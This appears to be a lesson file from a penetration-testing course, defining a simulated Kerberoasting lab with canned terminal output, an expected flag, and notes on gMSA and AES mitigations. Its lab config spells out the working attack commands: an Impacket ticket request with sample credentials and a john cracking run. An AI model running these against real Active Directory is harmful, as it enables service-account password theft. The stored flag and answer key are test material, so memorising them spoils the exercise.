---
id: mod-pt-301
track_id: track-pentest
slug: active-directory-kerberoasting
title: "301: Offline Kerberos Ticket Decryption (Kerberoasting)"
difficulty: Intermediate
order_index: 3
estimated_minutes: 35
lab_type: terminal
lab_briefing: "Request a Service Principal Name (SPN) ticket for mssql_svc, inspect the extracted ticket hash, and crack the RC4 ticket to submit the service password flag."
expected_flag: "FLAG{Summer2026!Password}"
hint: "Run GetUserSPNs.py followed by john --format=krb5tgs hashes.kerberoast."
lab_config:
  target_ip: "10.10.14.200"
  quick_commands:
    - "GetUserSPNs.py corp.local/jdoe:Password123 -dc-ip 10.10.14.200 -request"
    - "cat hashes.kerberoast"
    - "john --format=krb5tgs --wordlist=rockyou.txt hashes.kerberoast"
  commands:
    "GetUserSPNs.py corp.local/jdoe:Password123 -dc-ip 10.10.14.200 -request": "Impacket v0.12.0 - Copyright Fortra, LLC\n\nServicePrincipalName: MSSQLSvc/db01.corp.local:1433\nHash: $krb5tgs$23$*mssql_svc$CORP.LOCAL*$...\n[+] Ticket saved to hashes.kerberoast"
    "cat hashes.kerberoast": "$krb5tgs$23$*mssql_svc$CORP.LOCAL*$MSSQLSvc/db01.corp.local:1433*$4b227777...[SPN TICKET]"
    "john --format=krb5tgs --wordlist=rockyou.txt hashes.kerberoast": "Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])\nFLAG{Summer2026!Password} (mssql_svc)\n\n1 password hash cracked, 0 left"
---

# Kerberoasting Fundamentals
Kerberoasting is an offensive technique that targets Active Directory service accounts associated with Service Principal Names (SPNs).

## The Core Architectural Weakness
Any valid domain account (regardless of privileges) can request a Ticket Granting Service (TGS) ticket for any service registered in Active Directory. Because the Key Distribution Center (KDC) encrypts the ticket using the target service account's secret key (derived from its NTLM password hash), the requesting client can extract the ticket and attempt offline brute-force cracking.

## Mitigations & Modern Hardening
Organizations mitigate Kerberoasting by:
1. Transitioning service accounts to Group Managed Service Accounts (gMSA), which employ randomized 128-character passwords rotated automatically every 30 days.
2. Forcing AES256 encryption (`msDS-SupportedEncryptionTypes`) to neutralize fast GPU hash cracking algorithms designed for RC4-HMAC.
